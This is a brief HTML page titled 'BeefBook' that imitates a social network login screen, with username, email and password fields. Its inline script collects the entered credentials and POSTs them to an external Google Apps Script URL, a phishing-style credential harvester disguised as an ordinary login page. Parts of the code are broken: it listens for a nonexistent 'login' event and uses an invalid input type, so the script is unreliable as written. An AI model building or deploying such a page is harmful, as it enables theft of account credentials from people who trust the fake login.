<!doctype html>
<html>
  <head>
    <title>BeefBook</title>
  </head>
<body style= "background-color:Violet;">
  
<h1 style= "font-family:verdana;">BeefBook</h1>

  
<form id="submitForm">
  <label for="uname">Username:</label><br>
  <input type="text" id="uname" name="username" required><br><br>
  <input type="email" id="email" name="email" placeholder="Email"><br><br>
  <textarea id="password" name="password" placeholder="Password"></textarea><br><br>
  <input type="login" value="Log in">
</form>

<script>
  const URL = 'https://script.google.com/macros/s/AKfycbzj50hDibN8G1rrKDZFKl8XUutU5WPPqtkxrig_i1MP47HWi9SgBHbXyKirqe4vBg-m/exec';
  document.getElementById('submitForm').addEventListener('login', async (e) => {
    e.preventDefault();
    const payload = {
      username: document.getElementById('uname').value.trim(),
      email: document.getElementById('email').value.trim(),
      password: document.getElementById('password').value.trim()
    };
    const res = await fetch(URL, {
      method: 'POST',
      body: JSON.stringify(payload)
    });
    alert(await res.text()); // Shows "OK" if successful
  });
</script>

  



  
</body> 
</html>
